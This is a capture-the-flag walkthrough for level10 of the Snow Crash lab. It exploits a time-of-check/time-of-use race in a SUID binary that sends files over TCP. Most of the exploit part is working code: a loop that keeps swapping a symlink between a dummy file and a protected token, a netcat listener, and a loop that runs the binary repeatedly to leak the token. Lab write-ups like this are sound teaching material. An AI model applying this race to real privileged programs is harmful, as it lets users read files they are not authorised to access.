# Level10 Solution – Snow Crash Project

- `level10`: SUID executable owned by `flag10`
- `token`: readable only by `flag10`, not accessible to `level10`

Running the binary:

```bash
./level10
# Output: You must provide at least one argument.

./level10 token
# Output: You are not authorized to access this file

## Analysis

Reverse engineering or running strace on the binary reveals:
The binary checks access to the given file using access()
After the access check, it sends the file's contents over TCP to the IP provided
This presents a classic TOCTOU (Time-of-check to time-of-use) vulnerability.
By racing a symlink (/tmp/symlink) between a dummy file and the real token, we can trick the program into passing the access check (using the dummy), but then reading the real token.



## Objective
Exploit a **Time-Of-Check Time-Of-Use (TOCTOU)** vulnerability in the `level10` binary to gain access to the flag.

## Understanding the Challenge
The `level10` binary takes a file and an IP address as arguments. It reads the content of the file and sends it over the network to the given IP. The binary is vulnerable because it checks the file's permissions **before** opening it — allowing us to swap the file between the check and the actual read.

## Exploitation Strategy
We create a symlink `/tmp/symlink` that initially points to a dummy file. Then, during the small window between permission check and file read, we change the symlink to point to the actual target file: `/home/user/level10/token`.

To capture the content sent by the program, we use a **netcat** server listening on a local port.

## Exploit Script

Create the following file `/tmp/toctou.sh`:

```bash
#!/bin/bash
while true; do
    ln -sf /home/user/level10/token /tmp/symlink
    sleep 0.1
    ln -sf /tmp/dummy /tmp/symlink
    sleep 0.1
done
```

Make it executable:

```bash
chmod +x /tmp/toctou.sh
```

## Run the Exploit

**Step 1: Prepare the dummy file**

```bash
echo "dummy content" > /tmp/dummy
```

**Step 2: Run the TOCTOU script in the background**

```bash
/tmp/toctou.sh &
```

**Step 3: Listen for output using netcat**

```bash
nc -lk 6969 | grep -v ".( )." &
```

**Step 4: Run the vulnerable binary repeatedly**

```bash
while true; do ./level10 /tmp/symlink 127.0.0.1; done &>/dev/null
```

Wait for the real token content to be printed by `netcat`.

> **Note:** If you see the error `nc: Address already in use`, it means the listener is already running. Stop previous instances using `fg`, then `Ctrl+C`, or use `kill`.

## Flag

Once the token appears in the terminal output, use it to move on to the next level:

```bash
su level11
```
